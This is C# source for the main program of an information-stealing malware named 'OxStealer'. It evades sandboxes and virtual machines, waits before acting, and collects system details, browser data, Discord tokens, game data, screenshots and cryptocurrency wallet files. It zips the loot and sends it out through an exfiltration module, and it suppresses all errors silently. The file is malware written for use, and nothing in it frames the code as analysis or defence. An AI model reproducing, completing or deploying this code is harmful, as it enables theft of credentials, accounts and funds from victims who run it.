using System;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Management;

namespace OxStealer
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            if (IsSandbox()) return;
            Thread.Sleep(TimeSpan.FromSeconds(12));

            try
            {
                var payload = new System.Collections.Generic.Dictionary<string, object>
                {
                    ["sys"] = Modules.SysInfo.Collect()
                };

                if (Config.Modules.Browsers)   payload["browsers"]   = Modules.Browser.GrabAll();
                if (Config.Modules.Discord)    payload["discord"]    = Modules.Discord.GrabTokens();
                if (Config.Modules.Games)      payload["games"]      = Modules.Games.GrabAll();
                if (Config.Modules.Screenshots)payload["screens"]    = Modules.Screenshot.GrabAll();

                string zipPath = null;
                if (Config.Modules.Wallets)
                {
                    var wd = System.IO.Path.Combine(
                        System.IO.Path.GetTempPath(), "ox_" + Guid.NewGuid().ToString("N"));
                    System.IO.Directory.CreateDirectory(wd);
                    Modules.Wallets.GrabExtensions(wd);
                    Modules.Wallets.GrabFiles(wd);
                    zipPath = Utils.Zip.PackDir(wd);
                }

                await Modules.Exfil.Send(payload, zipPath); // Aggiunto await
            }
            catch { /* fail silent */ }
        }

        static bool IsSandbox()
        {
            string[] bad = { "vbox", "vmware", "qemu", "xen", "hyper-v", "sandbox", "cuckoo", "wine" };
            string probe = (Environment.MachineName + " " + Environment.UserName).ToLowerInvariant();
            foreach (var b in bad) if (probe.Contains(b)) return true;
            try
            {
                using var searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_ComputerSystem");
                foreach (var obj in searcher.Get())
                {
                    var model = obj["Model"]?.ToString()?.ToLowerInvariant() ?? "";
                    if (model.Contains("virtual") || model.Contains("vmware") || model.Contains("vbox"))
                        return true;
                }
            }
            catch { }
            return false;
        }
    }
}